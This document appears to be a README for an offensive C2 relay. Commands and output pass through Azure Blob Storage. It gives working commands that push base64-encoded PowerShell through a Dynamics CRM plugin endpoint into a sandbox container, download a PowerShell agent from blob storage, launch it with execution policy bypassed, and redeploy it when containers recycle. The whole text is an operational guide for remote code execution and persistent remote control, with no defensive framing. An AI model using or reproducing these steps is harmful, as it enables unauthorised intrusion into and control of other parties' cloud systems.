# C2 Relay

Blob storage C2 relay. The operator runs `c2_server.py` locally, the agent runs inside the container. Commands and output pass through Azure Blob Storage.

## Setup

Generate a SAS token:

```bash
ACCOUNT={your-storage-account}
KEY=$(az storage account keys list --account-name $ACCOUNT --query '[0].value' -o tsv)
SAS=$(az storage container generate-sas --account-name $ACCOUNT --account-key "$KEY" \
  --name {container} --permissions rcwdl --expiry $(date -u -v+4H +%Y-%m-%dT%H:%MZ) -o tsv)
```

Start the operator console:

```bash
python3 tools/c2/c2_server.py --storage-account $ACCOUNT --container {container} --sas-token "$SAS"
```

## Deploy the Agent

Upload it to blob storage:

```bash
az storage blob upload --account-name $ACCOUNT --account-key "$KEY" \
  --container-name {container} --name agent.ps1 --file tools/c2/agent.ps1 --overwrite
```

Download it to the sandbox container via the plugin. Use PowerShell's `-EncodedCommand` to avoid cmd.exe mangling the `&` characters in the SAS token:

```python
python3 -c "
import base64, json, urllib.request
sas = '{SAS}'
ps = \"Invoke-WebRequest -Uri 'https://{ACCOUNT}.blob.core.windows.net/{CONTAINER}/agent.ps1?\" + sas + \"' -OutFile C:/Windows/Temp/agent.ps1 -UseBasicParsing\"
b64 = base64.b64encode(ps.encode('utf-16-le')).decode()
msg = 'CMD:powershell -EncodedCommand ' + b64
data = json.dumps({'message': msg}).encode()
req = urllib.request.Request('https://{ORG}.crm.dynamics.com/api/data/v9.2/new_EchoMessage',
    data=data, headers={'Authorization': 'Bearer {TOKEN}', 'Content-Type': 'application/json'})
print(urllib.request.urlopen(req, timeout=30).read().decode()[:200])
"
```

Start the agent the same way:

```python
python3 -c "
import base64, json, urllib.request
sas = '{SAS}'
ps = \"Start-Process powershell -ArgumentList '-ExecutionPolicy Bypass -File C:/Windows/Temp/agent.ps1 -StorageAccount {ACCOUNT} -Container {CONTAINER} -SasToken \\\"\" + sas + \"\\\"'\"
b64 = base64.b64encode(ps.encode('utf-16-le')).decode()
msg = 'CMD:powershell -EncodedCommand ' + b64
data = json.dumps({'message': msg}).encode()
req = urllib.request.Request('https://{ORG}.crm.dynamics.com/api/data/v9.2/new_EchoMessage',
    data=data, headers={'Authorization': 'Bearer {TOKEN}', 'Content-Type': 'application/json'})
print(urllib.request.urlopen(req, timeout=30).read().decode()[:200])
"
```

The C2 web UI will now relay commands to the agent running in the container.

## Container Recycling

Sandbox containers recycle roughly every 30 minutes. When this happens the agent and any deployed tools are lost. You will need to re-run the download and agent start steps on the new container.
